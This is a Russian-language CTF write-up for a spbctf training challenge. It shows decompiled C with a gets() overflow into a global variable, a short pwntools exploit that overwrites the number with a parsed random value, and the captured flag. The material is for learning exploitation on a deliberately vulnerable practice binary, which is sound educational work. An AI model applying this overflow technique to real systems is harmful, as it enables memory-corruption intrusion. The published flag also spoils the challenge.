[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn1_mc8)
Описание:
Переполните автоматом, чтобы получить флаг. У вас одна секунда!
`nc 109.233.56.90 11588`
**[mc8_censored](https://pwn.spbctf.ru/files/overflow/mc8_censored)**
**[mc8_censored_notimeout](https://pwn.spbctf.ru/files/overflow/mc8_censored_notimeout)** — для тренировки локально без таймаута

Программа печатает рандомное число, которое при помощи pwntools надо считать, а затем необходимо переполнить буфер userInput, чтобы переписать num1 на рандомное число из random.
``` C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  int random; // [rsp+28h] [rbp-8h]

  v3 = time(nullptr);
  srand(v3);
  random = rand();
  printf(format, argv);
  printf("OK, here's the deal.\n");
  printf("We want you to set the value of number1 to '%d'.\n", random);
  printf("And you only have 1 second to check your superspeed.\n");
  alarm(1u);
  printf("Give me your input: ");
  gets(userInput);

  if ( number1 == random )
  {
    printf("Yissss!\n");
    printf("Flag is: spbctf{********************************}\n");
  }
  else
  {
    printf("YOU FAILED\n");
    printf("Because, here's the target number: %d\n", random);
    printf("      And here's the your number1: %d\n\n", number1);
    printf("See the difference?\n");
  }
  return 0;
}

// .data:0000000000601060 userInput       db 6Bh, 65h, 6Bh, 3Dh dup(0)
// .data:0000000000601060                                         ; DATA XREF: main+9A↑c
// .data:00000000006010A0                 public number1
// .data:00000000006010A0 ; int number1
// .data:00000000006010A0 number1         dd 0FFFFFFFFh           ; DATA XREF: main+AC↑r
```

Эксплоит:
``` python
io = start()

io.recvline()
io.recvline()
io.recvuntil(b"'")
num = int(io.recvuntil(b"'")[:-1].decode())
io.readline()
io.readline()
payload = b'A' * 64 + p32(num)
io.sendline(payload)

io.interactive()
```

Запуск:
![{E7893D1A-74C4-42F3-A9D5-97D404AAC5CF}](../../../../z.%20Images/{E7893D1A-74C4-42F3-A9D5-97D404AAC5CF}.png)

Ответ: `spbctf{w3lp_that_w4s_34sy_aft3r_prev1ous_1}`